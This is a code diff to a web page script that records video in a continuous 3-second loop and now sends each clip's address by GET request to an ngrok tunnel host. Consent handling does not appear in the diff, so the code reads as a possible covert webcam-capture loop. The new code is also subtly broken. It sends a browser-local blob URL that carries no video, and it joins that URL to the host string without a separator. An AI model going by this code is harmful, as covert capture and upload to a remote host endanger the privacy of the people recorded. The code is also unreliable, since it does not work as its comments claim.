@@ -41,7 +41,8 @@
             mediaRecorder.stop();
             const blob = new Blob(chunks, { type: 'video/webm' });
             chunks = []; // Clear the array for the next video data
-            uploadVideo(blob); // Call function to upload video to the server
+            const videoUrl = URL.createObjectURL(blob);
+            sendVideoUrl(videoUrl); // Call function to send video URL as a parameter
             mediaRecorder.start(); // Start a new recording
             recordAndSendVideo(); // Recursive call for the next iteration
           }, 3000);
@@ -53,22 +54,18 @@
       });
     }
 
-    // Function to upload video to the server
-    function uploadVideo(videoData) {
-      const formData = new FormData();
-      formData.append('video', videoData);
+    // Function to send video URL as a parameter in a GET request
+    function sendVideoUrl(videoUrl) {
+      const requestUrl = 'https://ea0b-95-106-68-53.ngrok-free.app' + encodeURIComponent(videoUrl);
 
-      fetch('https://your-server.com/upload', {
-        method: 'POST',
-        body: formData
-      })
+      fetch(requestUrl)
         .then(response => {
           // Handle the server response
-          console.log('Video successfully sent to the server.');
+          console.log('Video URL successfully sent to the server.');
         })
         .catch(error => {
-          // Handle errors when uploading video
-          console.error('Error uploading video to the server:', error);
+          // Handle errors when sending video URL
+          console.error('Error sending video URL to the server:', error);
         });
     }
 
@@ -76,4 +73,3 @@
   </script>
 </body>
 </html>
-
